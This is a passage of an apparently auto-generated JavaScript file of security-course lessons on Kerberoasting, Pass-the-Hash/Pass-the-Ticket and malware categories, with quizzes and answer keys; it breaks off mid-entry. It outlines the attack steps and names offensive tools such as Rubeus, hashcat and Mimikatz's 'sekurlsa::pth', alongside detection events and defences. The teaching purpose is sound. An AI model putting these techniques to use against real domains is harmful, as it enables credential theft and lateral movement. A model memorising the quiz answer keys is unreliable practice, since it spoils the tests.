// AUTO-GENERATED companion file of NEW standalone theory lessons.
// New focused lessons on specific high-value curriculum topics.
// Registered in builtinLessons.ts.

const NEW_TOPIC_LESSONS = [
{
  "id": "topic-lesson-kerberoasting",
  "slug": "kerberoasting-explained",
  "title": "Kerberoasting: Cracking Service Accounts Without Admin Rights",
  "topic": "Active Directory Attacks",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Kerberoasting is one of the most common — and most quietly dangerous — attacks in any Active Directory environment, because it lets an ordinary, non-privileged domain user walk away with the password of a powerful service account, and it does the hard part entirely offline where no lockout or alert can stop it. This lesson explains exactly how it works, why the design of Kerberos makes it possible, how you detect it in the logs, and how it is defended.",
  "sections": [
    {
      "heading": "What Kerberoasting Is and Why It Works",
      "content": "Kerberoasting (MITRE ATT&CK **T1558.003**) abuses a completely normal, by-design feature of **Kerberos**, the authentication protocol at the heart of Active Directory. To understand it you need one concept: the **SPN (Service Principal Name)**. When a service — a SQL database, a web app, a file share — runs under a domain **service account**, that account is registered with an SPN so that clients can request access to it through Kerberos.\n\nHere is the design that the attack exploits. When any user wants to use a service, they ask the Domain Controller (the **KDC**) for a **service ticket (TGS)** for that service's SPN. The KDC hands one over — and, crucially, **that ticket is encrypted with the service account's own password hash.** This is not a bug; it is how Kerberos proves to the service that the ticket is genuine. But it creates an opening: the requester now holds a blob of data that is encrypted with the service account's password, and they can take it away and try to crack it.\n\nThe two facts that make this dangerous together:\n\n- **Any authenticated domain user can request a TGS for any SPN.** You do not need to be an admin, and you do not need any special permission on the service — requesting the ticket is a normal operation the KDC will not refuse. So a single low-privilege account (or one the attacker has already phished) is enough to start.\n- **The ticket is crackable offline.** Because the ticket is encrypted with the service account's password hash, an attacker who captures it can try to guess that password on their **own hardware**, with no further contact with the Domain Controller.\n\nSo Kerberoasting turns a routine Kerberos request into a password-cracking opportunity, and the target — a service account — is often exactly the kind of account worth stealing: over-privileged, with a password that was set once years ago and never changed."
    },
    {
      "heading": "The Attack, Step by Step",
      "content": "The mechanics are short, which is part of why the attack is so popular. From a single ordinary domain account, the attacker:\n\n1. **Enumerates SPNs.** They query Active Directory (via LDAP) for all accounts that have an SPN registered — this lists every service account that can be Kerberoasted. This is a normal read that any user can perform.\n2. **Requests a service ticket (TGS) for the chosen SPN.** A single Kerberos request to the KDC returns the ticket, encrypted with the target service account's password hash. Tools automate this in seconds (Rubeus, Impacket's GetUserSPNs, PowerShell).\n3. **Extracts the encrypted ticket** from memory and saves it to a file.\n4. **Cracks it offline.** They feed the ticket to a password-cracking tool such as **hashcat** or John the Ripper on their own machine, trying enormous wordlists and rule-based guesses. If the service account's password is weak, it falls — and now the attacker knows the **real password** of that service account.\n\nThe result is not a hash to replay but the **actual cleartext password**, which the attacker can use to log in directly as the service account, wherever it has access. And because step 4 happens entirely offline, everything after step 3 is invisible to your defences.\n\nThe single most important thing to internalise is that steps 1 and 2 — the only parts that touch your network — look almost exactly like legitimate Kerberos activity, because they *are* legitimate Kerberos requests. The attack hides inside the normal operation of the protocol, which is why detecting it depends on subtle signals rather than an obviously malicious action."
    },
    {
      "heading": "Why It Is So Effective — and So Stealthy",
      "content": "Kerberoasting sits near the top of every attacker's Active Directory playbook because it combines low cost, high reward, and stealth:\n\n- **It needs no privilege to start.** Unlike attacks that require admin rights, Kerberoasting works from *any* domain account. A single phished user, an intern's laptop, a low-privilege foothold — all are enough. This is what makes it a favourite early move after initial access.\n- **The reward is often huge.** Service accounts are frequently **over-privileged** — granted far more access than the service truly needs, sometimes even Domain Admin — because that was the easy way to make the service work years ago. So cracking one weak service-account password can hand the attacker sweeping access, turning a foothold into near-total control.\n- **The cracking is offline and untouchable.** Once the ticket is captured, guessing the password happens on the attacker's hardware. Your account-lockout policy, your rate limits, your failed-logon alerts — none of them apply, because there are no logon attempts against your systems at all. The attacker can grind for days.\n- **The service password rarely changes.** Human passwords expire and rotate; service-account passwords are often set once and left for years because changing them risks breaking the service. That gives the attacker a large, stable target and all the time in the world.\n\nThere is one more technical wrinkle that helps the attacker: **the encryption type**. Kerberos can protect tickets with strong AES or with the older, weaker **RC4**. RC4-encrypted tickets are dramatically faster to crack, so attackers specifically request RC4 where they can — which, helpfully for defenders, is also one of the clearest signals that a Kerberoasting attack is under way."
    },
    {
      "heading": "Detecting Kerberoasting in the Logs",
      "content": "Because the network-facing part of Kerberoasting is a normal Kerberos request, detection is about spotting *anomalous patterns* in ticket requests rather than an obviously bad event. The workhorse is **Windows Event ID 4769 — 'A Kerberos service ticket was requested'** — logged on the Domain Controllers. Every service-ticket request generates one, so the raw volume is huge; the skill is filtering for the tells:\n\n- **Encryption type 0x17 (RC4).** The 4769 event records the ticket-encryption type. A request for a service ticket using **RC4 (type 0x17)** in an environment that should be using AES is a strong Kerberoasting indicator, because attackers deliberately downgrade to RC4 to crack faster. Alerting on 4769 with encryption type 0x17 is one of the highest-value AD detections you can build.\n- **Volume and fan-out from one account.** A single user account requesting service tickets for **many different SPNs in a short window** is highly abnormal — a real user touches a handful of services, not dozens in a burst. That fan-out is the signature of an attacker enumerating and roasting every service account at once.\n- **Requests for SPNs the account never normally uses**, or a spike of 4769s against sensitive service accounts, are worth surfacing.\n- **Honeypot (decoy) service accounts.** A powerful, deliberate detection: create a service account with an SPN, a tempting name, and a *strong* password, and grant it nothing. No legitimate process ever requests its ticket — so **any** 4769 for that honeypot's SPN is almost certainly an attacker enumerating SPNs, giving you a near-zero-false-positive alarm.\n\nThe analyst mindset here mirrors the rest of the curriculum: no single 4769 is malicious, so you hunt the *pattern* — RC4 downgrade, one account fanning out to many SPNs, or a hit on a honeypot — rather than any one event."
    },
    {
      "heading": "Defending Against Kerberoasting",
      "content": "Because the attack cracks a password offline, every defence comes down to one of two ideas: make the password **impossible to crack**, or **remove the reward** if it is. Both matter, and a mature environment does both.\n\n**Make the password uncrackable:**\n\n- **Use very long, random service-account passwords.** Offline cracking only wins against guessable passwords; a 25+ character random password is effectively uncrackable with today's hardware, which neutralises the attack even though the attacker still gets the ticket. This is the single most important control.\n- **Use Group Managed Service Accounts (gMSA).** A gMSA has a **long, complex password that Active Directory manages and rotates automatically** (every 30 days by default), with no human ever knowing or setting it. This is the modern best-practice answer to Kerberoasting: the password is both uncrackable and constantly changing.\n- **Enforce AES over RC4.** Configuring accounts and the domain to use AES encryption for Kerberos removes the fast-cracking RC4 path, making any captured ticket far harder to break.\n\n**Remove the reward:**\n\n- **Apply least privilege to service accounts.** A service account should have only the access its service genuinely needs — never Domain Admin 'to be safe.' Then, even if its password is cracked, the blast radius is small. Over-privileged service accounts are what turn a Kerberoast into a domain compromise.\n- **Audit and reduce SPNs.** Every account with an SPN is roastable; removing SPNs from accounts that no longer need them shrinks the attack surface.\n\nThe takeaway ties the lesson together: you cannot stop a domain user from requesting a service ticket — that is Kerberos working as designed — so you defeat Kerberoasting by making the ticket worthless to crack (long/managed passwords, AES) and worthless if cracked (least privilege), while watching Event 4769 for the RC4-and-fan-out pattern that reveals the attempt.",
      "image": {
        "src": "/lesson-images/ad/kerberoasting-flow.svg",
        "alt": "A diagram of a Kerberoasting attack. Any domain user — a normal, low-privilege or stolen account with no admin rights — sends step 1, a request to the KDC (Domain Controller) for a service ticket (TGS) for a service principal name such as svc-sql. In step 2 the KDC returns the TGS by design, encrypted with the service account's password hash using RC4. The service account, for example svc-sql, has an SPN registered and often a weak, never-changed password. Step 3: the attacker takes the encrypted ticket offline and cracks it with hashcat on their own hardware — no more traffic to the DC, nothing to lock out or alert — and if the password is weak it falls, giving the attacker that account's real password. Why it is dangerous: service accounts are often over-privileged and any user can request the ticket, so one normal account becomes a path to a powerful service account, and the cracking is offline so lockout and rate-limits do not apply (MITRE ATT&CK T1558.003). How to catch it: Event 4769 (service ticket requested) with encryption type 0x17 (RC4) plus one account requesting many SPN tickets in a burst; defend with long or random service-account passwords or gMSA, and AES.",
        "caption": "Kerberoasting: any domain user requests a service ticket encrypted with the service account's password, then cracks it offline. Catch it via Event 4769 with RC4 (0x17) + one account fanning out to many SPNs.",
        "credit": "Figure authored for this course. Technique per MITRE ATT&CK T1558.003."
      }
    }
  ],
  "keyTakeaways": [
    "Kerberoasting (T1558.003) abuses a Kerberos design feature: any authenticated domain user can request a service ticket (TGS) for any SPN, and that ticket is encrypted with the service account's password hash — so a low-privilege account (no admin needed) can capture it and crack the password OFFLINE, where lockouts and alerts never apply.",
    "It is effective because service accounts are often over-privileged with weak, never-changed passwords, and attackers downgrade to RC4 to crack faster; detect it via Event 4769 with encryption type 0x17 (RC4) + one account fanning out to many SPNs (or a honeypot SPN account), and defend by making the password uncrackable (long/random passwords, gMSA auto-rotation, AES) and worthless if cracked (least privilege on service accounts)."
  ],
  "quiz": [
    {
      "question": "An attacker has compromised a single ordinary domain user account with no special privileges. Using only that account, they are able to obtain and later crack the password of a powerful SQL service account. How is this possible without any elevated rights, and what is the attack called?",
      "options": [
        {
          "label": "It is impossible without admin rights, because obtaining another account's password always requires domain-administrator privileges, so the scenario as described could not actually occur in a real environment",
          "value": "a"
        },
        {
          "label": "Kerberoasting (T1558.003): any domain user can request a Kerberos service ticket for the service's SPN, and the ticket is encrypted with the service account's password hash — the attacker captures it and cracks it offline, needing no elevated rights at all",
          "value": "b"
        },
        {
          "label": "Pass-the-Hash, because requesting a service ticket automatically hands the requester the plaintext password of every account in the domain in a single step regardless of permissions",
          "value": "c"
        },
        {
          "label": "A brute-force attack against the SQL service's login, which succeeds only because the attacker's ordinary account was secretly granted administrator rights on the domain controller beforehand",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "This is Kerberoasting: because any authenticated domain user can request a service ticket (TGS) for any SPN, and the KDC encrypts that ticket with the target service account's password hash, an ordinary account can capture the ticket and crack the password entirely offline — no elevated rights required. Option a is wrong; the whole danger is that no privilege is needed. Option c misdescribes Pass-the-Hash (which replays a hash, and does not hand over plaintext for every account). Option d invents secret admin rights the scenario does not have; Kerberoasting works precisely without them."
    },
    {
      "question": "You want to build a high-fidelity detection for Kerberoasting on your domain controllers. Which signal is most characteristic of the attack, and why?",
      "options": [
        {
          "label": "A spike in Event 4625 (failed logons), because Kerberoasting works by repeatedly attempting to log in to each service account until the correct password is guessed against the live domain controller",
          "value": "a"
        },
        {
          "label": "Event 4769 (service ticket requested) with encryption type 0x17 (RC4), especially with one account requesting tickets for many different SPNs in a burst — attackers downgrade to RC4 to crack faster, and the fan-out reveals SPN enumeration",
          "value": "b"
        },
        {
          "label": "A sudden increase in outbound network traffic on port 443, because Kerberoasting exfiltrates the cracked passwords to an external command-and-control server over HTTPS as its final and most detectable step",
          "value": "c"
        },
        {
          "label": "Event 1102 (the security log was cleared), since Kerberoasting always begins by wiping the domain controller's logs to hide the ticket requests before it starts enumerating service accounts",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The most characteristic signal is Event 4769 with RC4 encryption (type 0x17), particularly when one account requests service tickets for many SPNs in a short window: attackers deliberately request the weaker RC4 to speed up offline cracking, and roasting every service account at once produces an abnormal fan-out. Option a is wrong because the cracking is offline — Kerberoasting generates no failed logons against your systems. Option c invents an HTTPS-exfiltration step that is not part of the attack's signature. Option d describes log clearing, which is a different technique and not intrinsic to Kerberoasting."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1558/003/",
    "https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769",
    "https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"
  ],
  "xp": 240,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-pth-ptt",
  "slug": "pass-the-hash-and-pass-the-ticket",
  "title": "Pass-the-Hash and Pass-the-Ticket: Authenticating Without the Password",
  "topic": "Active Directory Attacks",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Two of the most important credential-reuse techniques in Windows attacks share one unsettling idea: the attacker never needs to know the actual password. Instead they steal the cryptographic proof of identity — an NTLM hash or a Kerberos ticket — and replay it directly. This lesson explains how Pass-the-Hash and Pass-the-Ticket work, why they make lateral movement so easy, and how you detect and defend against them.",
  "sections": [
    {
      "heading": "The Core Idea: The Hash or Ticket IS the Credential",
      "content": "The single concept that unlocks both attacks is this: **Windows authentication does not always require your password — it requires proof that you know it, and that proof can be stolen and reused.** Understanding this dissolves the intuition that stealing a password means cracking it.\n\nWhen you log into Windows, the system does not keep your plaintext password lying around; it keeps a **hash** of it (for NTLM authentication) and issues you **Kerberos tickets** (for Kerberos authentication) that prove you already authenticated. These secrets live in the memory of the **LSASS** process. The crucial fact is that both the hash and the ticket function as **password-equivalents**: the authentication protocols accept them as proof of identity *directly*.\n\nSo an attacker who dumps these secrets from LSASS (the credential-theft you met in the Windows-internals lesson) does not need to crack anything. They simply **replay** the stolen hash or ticket, and the target system authenticates them as the victim. This is why the two attacks are grouped under MITRE ATT&CK **T1550 — Use Alternate Authentication Material**: the attacker uses the *material* that stands in for the password, not the password itself.\n\nTwo consequences follow, and they are what make these techniques so dangerous:\n\n- **Cracking is skipped entirely.** Unlike Kerberoasting or offline password cracking, there is no guessing — the secret is used as-is, instantly. A strong, uncrackable password does not help if its hash or ticket is stolen and replayed.\n- **Stealing the secret needs admin on only ONE machine.** Dumping LSASS requires local admin on a single host. From that one foothold, the attacker harvests every credential that has been used on that machine — and replays them to reach everywhere those accounts can go. This is the engine of lateral movement across a domain."
    },
    {
      "heading": "Pass-the-Hash (T1550.002)",
      "content": "**Pass-the-Hash (PtH)** targets **NTLM authentication.** When Windows authenticates a user over NTLM, it proves knowledge of the password using the **NTLM hash** of that password — not the plaintext. That design choice is the whole vulnerability: if the protocol only ever uses the hash, then possessing the hash is as good as possessing the password.\n\nThe attack is direct. Having dumped a user's NTLM hash from LSASS on a compromised host, the attacker feeds that hash to a tool (Mimikatz, Impacket's tools, or a built-in via `sekurlsa::pth`) that authenticates to a *remote* system — a file share, a management interface, another workstation — presenting the hash as proof. The remote system runs NTLM authentication, the hash validates, and the attacker is **logged in as the victim** without ever knowing or cracking the password.\n\nWhy this is a lateral-movement powerhouse:\n\n- **Local admin passwords are the classic target.** If every machine shares the *same* local administrator password (and therefore the same hash), a single dumped hash unlocks the entire fleet via PtH — which is exactly the problem Microsoft's **LAPS** (unique per-machine local-admin passwords) was built to solve.\n- **Privileged domain accounts are worse.** A domain admin's hash, harvested from any machine they logged into, lets the attacker Pass-the-Hash straight to domain-wide control — which is why tiering (keeping domain-admin logons off ordinary workstations) matters so much.\n\nThe defining detection idea is that PtH produces **NTLM authentication** where you might otherwise expect Kerberos. In a modern, Kerberos-first domain, a burst of NTLM logons — especially between workstations, or to sensitive systems, using privileged accounts — is anomalous, and the domain controller records NTLM credential validation as **Event 4776**. PtH also surfaces as **4624 type 3 (network) logons** followed by **4672 (special privileges)** on the target when a privileged hash is replayed."
    },
    {
      "heading": "Pass-the-Ticket (T1550.003)",
      "content": "**Pass-the-Ticket (PtT)** is the Kerberos equivalent: instead of a hash, the attacker steals and replays a **Kerberos ticket.** Recall from the authentication lessons that Kerberos issues two kinds of ticket — a **TGT (Ticket-Granting Ticket)**, which proves you authenticated and lets you request service tickets, and **service tickets (TGS)**, which grant access to a specific service. Both live in memory, and both can be stolen.\n\nThe attack: from a compromised host, the attacker extracts a valid ticket from LSASS memory (again with tools like Mimikatz or Rubeus) and **injects it into their own logon session.** From then on, the attacker's session *is* that identity as far as Kerberos is concerned — they present the ticket to services, which honour it because a valid ticket is proof that its holder already authenticated. Steal a **TGT** and the attacker can request service tickets to anything the victim can reach; steal a **service ticket** and they get that specific service directly.\n\nWhy PtT matters alongside PtH:\n\n- **It works where Kerberos is used** — which, in a modern domain, is most of the time. As organisations reduce NTLM to blunt Pass-the-Hash, Pass-the-Ticket becomes the natural successor, because it abuses the protocol that replaced NTLM.\n- **It is the foundation for the elite AD attacks.** The Golden Ticket and Silver Ticket attacks are, at bottom, Pass-the-Ticket with a *forged* ticket rather than a stolen one — so understanding PtT is the prerequisite for those.\n\nA key defensive lever specific to PtT is **ticket lifetime**: tickets expire (a TGT typically after ~10 hours), so a stolen *legitimate* ticket is only useful within its validity window — which is one reason short, well-configured ticket lifetimes limit the damage, and why a forged ticket with an absurdly long lifetime is itself a detection signal."
    },
    {
      "heading": "Detection and Defence",
      "content": "Because both attacks replay legitimate credentials, they blend into normal authentication — so detection leans on *anomalies* and defence leans on *removing the stealable secret* and *shrinking what it unlocks*.\n\n**Detection signals:**\n\n- **NTLM where Kerberos is expected.** A rise in NTLM authentication (**Event 4776** on the DC), especially by IP, between workstations, or with privileged accounts in a Kerberos-first environment, is a Pass-the-Hash smell.\n- **Anomalous network logons.** **4624 type 3** logons from unusual sources followed by **4672 (special privileges)**, or a privileged account suddenly authenticating to many hosts, point at replayed credentials driving lateral movement.\n- **Ticket anomalies.** For Pass-the-Ticket, tickets with abnormal lifetimes or encryption, or tickets used from a host different from the one that obtained them, are red flags.\n- **The precursor is the loudest signal.** Both attacks require stealing the secret first — so a **process opening LSASS (Sysmon Event ID 10)**, the credential-dumping detection from the Windows lesson, is often your earliest and clearest warning, before any replay happens.\n\n**Defences — remove the secret and limit its reach:**\n\n- **Protect LSASS.** **Credential Guard** isolates secrets in a virtualised container so they cannot be dumped by ordinary means; this attacks the problem at its root by making the hash/ticket unstealable in the first place.\n- **LAPS** gives every machine a unique local-admin password, so one stolen hash unlocks exactly one host instead of the whole fleet.\n- **Administrative tiering** keeps privileged credentials off the machines most likely to be compromised, so a workstation compromise cannot yield a domain-admin hash to pass.\n- **Reduce NTLM and shorten ticket lifetimes**, removing the easy Pass-the-Hash path and limiting how long a stolen ticket is useful.\n\nThe takeaway ties back to the whole credential story: you cannot stop Windows from using hashes and tickets — that is how authentication works — so you defeat Pass-the-Hash and Pass-the-Ticket by making the secret unstealable (Credential Guard), unique (LAPS), and low-value (tiering), while watching for the LSASS access that precedes every replay and the NTLM/logon anomalies that reveal it in progress.",
      "image": {
        "src": "/lesson-images/ad/pass-the-hash-ticket.svg",
        "alt": "A diagram of Pass-the-Hash and Pass-the-Ticket, showing that the hash or ticket is the credential and no plaintext password is needed. Pass-the-Hash (T1550.002): the attacker dumped an NTLM password hash from LSASS and never cracked it; they authenticate to a remote host or share WITH the hash, and NTLM authentication accepts the hash as proof of identity without asking for the plaintext, so they are logged in as the victim. Pass-the-Ticket (T1550.003): the attacker stole a Kerberos ticket (TGT or TGS) from memory and injects it into their own logon session, then presents the ticket to a Kerberos service, which grants access to the ticket's identity because the ticket already proves the holder authenticated, again with no password. Why it matters: stealing the hash or ticket needs only admin on one host (LSASS), cracking is skipped because the secret is replayed as-is, and this is how attackers move laterally across the domain. Detect and defend: NTLM logons where Kerberos is expected (Event 4776, 4624 type 3 plus 4672), protect LSASS with Credential Guard, and use LAPS, tiering, disabling NTLM, and short ticket lifetimes.",
        "caption": "In Pass-the-Hash and Pass-the-Ticket the stolen hash/ticket IS the credential — replayed directly, no cracking. Defeat it by making the secret unstealable (Credential Guard), unique (LAPS), and low-value (tiering).",
        "credit": "Figure authored for this course. Techniques per MITRE ATT&CK T1550.002 / T1550.003."
      }
    }
  ],
  "keyTakeaways": [
    "Windows authentication accepts the NTLM hash (Pass-the-Hash) or a Kerberos ticket (Pass-the-Ticket) as proof of identity DIRECTLY — both are password-equivalents living in LSASS memory — so an attacker replays the stolen secret without ever cracking a password (MITRE T1550): a strong password doesn't help if its hash/ticket is stolen, and dumping LSASS needs admin on just ONE host to then reach everywhere those accounts go (the engine of lateral movement).",
    "Pass-the-Hash abuses NTLM (watch for NTLM/4776 where Kerberos is expected, 4624 type-3 + 4672); Pass-the-Ticket abuses Kerberos (watch for ticket-lifetime/host anomalies, and it's the basis of Golden/Silver Ticket); the earliest signal for both is LSASS access (Sysmon Event ID 10) BEFORE the replay — defend by making the secret unstealable (Credential Guard), unique per host (LAPS), and low-value (admin tiering), plus reducing NTLM and shortening ticket lifetimes."
  ],
  "quiz": [
    {
      "question": "An organisation enforces very strong, uncrackable passwords, yet an attacker who compromised one workstation is authenticating to other machines as a domain administrator without ever knowing or cracking that admin's password. How is this possible, and what technique is in use?",
      "options": [
        {
          "label": "It is impossible, because strong uncrackable passwords make it fundamentally impossible for an attacker to authenticate as another user under any circumstances, so the scenario cannot really be happening",
          "value": "a"
        },
        {
          "label": "Pass-the-Hash / Pass-the-Ticket (T1550): the attacker dumped the admin's NTLM hash or Kerberos ticket from LSASS on the compromised host and replays it directly — Windows accepts the hash/ticket as proof, so password strength is irrelevant once the secret is stolen",
          "value": "b"
        },
        {
          "label": "A dictionary attack that succeeded because the admin's password, despite policy, was actually the word 'password', which is the only way to authenticate as another user without their real credentials",
          "value": "c"
        },
        {
          "label": "The attacker guessed the password through the domain controller's login prompt, which is why account-lockout policy is the single control that would have completely prevented this activity",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Windows accepts the NTLM hash and the Kerberos ticket as direct proof of identity, so an attacker who dumped the admin's hash or ticket from LSASS on the compromised host can replay it (Pass-the-Hash / Pass-the-Ticket, T1550) and authenticate as the admin — no cracking involved, which is why even an uncrackable password does not help. Option a misunderstands that the attack bypasses the password entirely. Option c invents a weak password contradicting the premise. Option d describes online guessing, which is not what is happening — there are no password attempts, just replayed secrets."
    },
    {
      "question": "In a Kerberos-first Windows domain, you observe a spike of NTLM authentications (Event 4776) between workstations using a privileged account, shortly after a process was seen opening lsass.exe on one of those hosts. What does this sequence most likely indicate?",
      "options": [
        {
          "label": "Routine Kerberos operation, because NTLM and Kerberos are the same protocol and a spike in one is simply normal domain authentication that never warrants any investigation at all",
          "value": "a"
        },
        {
          "label": "Credential theft then Pass-the-Hash: LSASS access dumped a hash, and the NTLM-where-Kerberos-is-expected logons by a privileged account are the replay driving lateral movement — LSASS access is the earliest warning",
          "value": "b"
        },
        {
          "label": "A failed backup job, since LSASS access and NTLM authentication together are the normal signature of backup software and carry no security meaning whatsoever for an analyst",
          "value": "c"
        },
        {
          "label": "Proof that the domain has switched to NTLM permanently, which is a beneficial security upgrade and explains the spike as an intended and desirable configuration change",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The sequence is textbook: a process opening lsass.exe indicates credential dumping, and the following NTLM authentications (4776) in a Kerberos-first domain — privileged account, workstation-to-workstation — are the Pass-the-Hash replay driving lateral movement. The LSASS access is the earliest and clearest warning, before the replay. Option a falsely equates NTLM and Kerberos and dismisses a real signal. Option c invents a benign backup explanation the pattern does not fit. Option d misframes a Pass-the-Hash indicator as a beneficial upgrade; NTLM is the weaker, older protocol."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1550/002/",
    "https://attack.mitre.org/techniques/T1550/003/",
    "https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-malware-types",
  "slug": "malware-types-field-guide",
  "title": "Malware Types: A Field Guide for the SOC Analyst",
  "topic": "Malware",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Virus, worm, trojan, RAT, rootkit, ransomware, infostealer, dropper, loader — the vocabulary of malware can feel like a pile of interchangeable scary words. It is not. Each term describes a malware's PURPOSE, and knowing which is which tells you immediately what a sample is trying to do and what you must check next. This lesson is a field guide organised the way analysts actually think: not by name, but by what the malware is FOR.",
  "sections": [
    {
      "heading": "Why We Categorise Malware by Purpose, Not by Name",
      "content": "The first thing to unlearn is the idea that these terms are a neat, exclusive taxonomy where every sample is exactly one thing. Real-world malware is almost always **several of these categories at once** — a trojan that drops a loader that installs an infostealer, or a worm that carries ransomware. The words describe *functions*, and one program can perform many.\n\nSo the useful way to think is by **purpose**: what is this malware *for*? Every category answers a different question about a sample:\n\n- **How does it spread?** (virus, worm, trojan)\n- **How does it hide?** (rootkit, fileless, packer)\n- **How does it get onto and stage the system?** (dropper, loader, downloader)\n- **What does it steal or watch?** (spyware, infostealer, keylogger)\n- **How does the attacker control it?** (RAT, bot, backdoor)\n- **What is the attacker's end goal / payoff?** (ransomware, wiper, cryptominer)\n\nThis matters enormously for an analyst, because **the category drives your investigation.** Knowing a sample is an *infostealer* immediately tells you to ask 'what credentials and data left the environment?'. Knowing it is a *worm* tells you to ask 'which other hosts did it spread to?'. Knowing it is a *RAT* tells you to find the command-and-control channel. Knowing it is *ransomware* tells you to scope the encryption and check your backups. The type is not trivia — it is the fastest route to the right next question.\n\nThe rest of this lesson walks the categories. Do not memorise them as isolated definitions; learn them as a set of *lenses* you apply to any sample: 'what does this thing do — how does it spread, hide, deliver, steal, control, and what is its payoff?'"
    },
    {
      "heading": "How It Spreads: Virus, Worm, and Trojan",
      "content": "The oldest distinctions are about **propagation** — how the malware gets from one place to the next.\n\n- **Virus.** A virus attaches itself to a **host file or program** and requires a **user to run that file** to activate and spread. Like a biological virus, it needs a host and it needs help propagating (a person opening the infected file). Pure classic viruses are rarer today, but the term persists — and the key property to remember is *needs a host + needs user action*.\n- **Worm.** A worm is **self-propagating**: it spreads across a network **on its own**, with no host file and no user needed, typically by exploiting a vulnerability or abusing credentials to copy itself to other machines. This autonomy is what makes worms so dangerous and fast — WannaCry (2017) spread worldwide in hours precisely because its ransomware payload had a worm's self-spreading engine. When you identify worm behaviour, the urgent question is always *how many other hosts already have it?*.\n- **Trojan.** A trojan (from the Trojan Horse) **disguises itself as something the user wants** — a cracked game, a fake invoice, a legitimate-looking installer — to trick the victim into running it. It does not self-spread and does not infect other files; its whole trick is *social*, relying on the user to invite it in. 'Trojan' describes the *delivery disguise*, which is why it so often combines with other categories: a **trojan dropper**, a **banking trojan**, a **RAT delivered as a trojan**.\n\nThe practical distinction to carry: **a virus needs a host file and a user; a worm needs neither and spreads itself; a trojan is a disguise that relies on the user.** These answer the 'how did it get here and how far could it go?' question that opens most malware investigations."
    },
    {
      "heading": "Delivery and Stealth: Droppers, Loaders, Rootkits, and Fileless",
      "content": "Two more sets of categories describe the *first stage* (getting the real payload onto the system) and *staying hidden* once there.\n\n**Delivery — the malware whose job is to bring more malware:**\n\n- **Dropper.** A dropper **carries the malicious payload inside itself** and writes ('drops') it onto disk, then runs it. It is a self-contained delivery vehicle.\n- **Loader / Downloader.** A loader **fetches the next stage from the internet** and runs it (often in memory). A downloader pulls additional malware. These first-stage tools are what you frequently catch *first* — a maldoc's macro launching a loader — and catching them early can stop the real payload from ever arriving.\n\n**Stealth — the malware whose job is to not be seen:**\n\n- **Rootkit.** A rootkit **hides deep in the system** — often at the kernel level — to conceal the attacker's presence: hiding processes, files, and network connections from the operating system and from security tools. Rootkits are among the hardest malware to detect precisely because they subvert the very tools you would use to find them, which is why detection often relies on external/behavioural signals rather than asking the compromised OS.\n- **Fileless malware.** As the malware-triage lesson covered, fileless malware **runs in memory using trusted built-in tools** and writes no malicious file, evading signature scanning and hash reputation entirely — caught by behaviour, not by a file.\n- **Packers / crypters** obfuscate a malware's code so it looks different on disk and its strings are hidden, defeating simple signature matching (the high-entropy tell from the crypto lesson).\n\nThe analyst takeaway: droppers and loaders are the *first stage* — catching them is your early-intervention opportunity — while rootkits, fileless techniques, and packing are all about **evading detection**, which is why 'the AV is clean' never closes a case on its own."
    },
    {
      "heading": "Theft, Control, and the Payoff",
      "content": "The final categories describe what the malware ultimately *does for the attacker* — steal, control, or cause impact.\n\n**What it steals or watches:**\n\n- **Spyware** covertly monitors the user — activity, screenshots, browsing.\n- **Infostealer** is the modern powerhouse: it rapidly harvests **credentials, browser cookies and saved passwords, session tokens, and cryptocurrency wallets**, then exfiltrates them. Infostealers feed the criminal economy (stolen credentials are sold), so identifying one means asking *what was taken and which accounts are now exposed?*.\n- **Keylogger** records every keystroke, capturing passwords and messages as they are typed.\n\n**How the attacker controls it:**\n\n- **RAT (Remote Access Trojan)** gives the attacker **full interactive remote control** of the machine — like remote-desktop for the adversary. Finding a RAT means finding its **command-and-control** channel.\n- **Bot** enrols the machine into a **botnet** that takes commands from a central controller (for DDoS, spam, or mining).\n- **Backdoor** provides the attacker **quiet re-entry** — a way back in that survives even if the original infection is cleaned, which is why eradication must hunt for backdoors, not just the obvious payload.\n\n**The payoff — the attacker's end goal:**\n\n- **Ransomware** encrypts data and extorts payment (the ransomware lesson covers its full lifecycle).\n- **Wiper** destroys data outright with no ransom — pure sabotage, often disguised as ransomware.\n- **Cryptominer** hijacks the victim's compute to mine cryptocurrency, stealing electricity and performance rather than data.\n\nThe unifying lesson, and the reason this field guide matters: **real malware combines these categories, so you describe what a sample DOES rather than forcing it into one label** — a trojan dropper that loads an infostealer and installs a backdoor is four categories in one. And each category you identify hands you the next investigation question: infostealer → what data/creds left; worm → which hosts; RAT/backdoor → what C2 and re-entry; ransomware/wiper → scope and recoverability. Naming the type is the fastest way to know what to check and how to respond.",
      "image": {
        "src": "/lesson-images/malware/malware-types-by-purpose.svg",
